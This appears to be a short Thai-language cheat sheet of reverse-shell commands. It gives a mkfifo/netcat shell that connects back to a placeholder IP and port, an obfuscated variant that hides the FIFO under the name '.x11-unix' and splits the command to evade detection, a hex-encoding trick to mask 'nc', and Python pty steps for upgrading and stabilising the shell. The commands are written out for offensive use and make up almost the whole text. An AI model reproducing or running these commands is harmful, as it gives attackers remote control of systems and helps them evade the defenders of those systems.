Shell แบบต่างๆ
---------------

แบบใช้ได้ทุกระบบ เก่าๆก็ใช้ได้

แบบไม่ได้เข้ารหัสหรือทำ evas
sh -c 'rm -f /tmp/f;mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <ip> <port> > /tmp/f'

แบบ Split หลบ
Obfuscation + No base64
ก่อน
sh -c 'rm -f /tmp/.x11-unix;mkfifo /tmp/.x11-unix; cat /tmp/.x11-unix | sh -i 2>&1 | nc <ip> <port> > /tmp/.x11-unix'

หลัง แต่ยังหลบไม่มากเพราะยังมี nc, sh -i ชัดเจนอยู่
sh -c "$(echo r$(echo m\ -f\ /tmp/.x11-unix\;\ mkfifo\ /tmp/.x11-unix\;\ cat /tmp/.x11-unix\|sh\ -i\ 2>&1\|nc\ IP\ Port\ >\ /tmp/.x11-unix) )"
Note: ใช้ชื่อ .x11-unix เพื่อพราง

ต่อไปแบบหลบขั้นสูงขึ้น
$(printf \\x6e\\x63)   = nc
เข้ารหัสเป็น hex

---------------------
python upgrade shell
python -c 'import pty; pty.spawn("/bin/bash")'

---------------------
Upgrade shell อีกทาง
เพื่อให้เราใช้ sudo, ลูกศรชี้ขึ้น ลง ... ได้เพื่อให้สะดวกต่อการใช้คำสั่งต่างๆ
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
<Enter>
export PS1="\u@\h:\w$ "
alias ll='ls -la'
